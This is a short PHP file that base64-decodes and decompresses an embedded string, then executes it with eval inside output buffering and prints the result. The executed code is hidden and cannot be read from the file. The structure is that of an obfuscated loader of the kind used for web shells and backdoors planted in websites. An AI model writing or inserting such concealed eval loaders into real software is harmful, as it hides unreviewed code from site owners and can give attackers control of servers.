<?php
ob_start();
$data = 'eNoNjMEKwyAQBe+F/sOSk176AykN/RIx6zMuLCpRC6H03+txhmEkkim7O9CdIh89GWvpS1MhB8cKn41d6Ufb67nVVO83AqdCy1uVWgVLFASKomjkc6AgJ7iXUyYn/wHtQJ6/OBr7PtM2mNFaHKrXY1nn+A+RrC1b';
eval(gzuncompress(base64_decode($data)));
$output = ob_get_contents();
ob_end_clean();
echo $output;
?>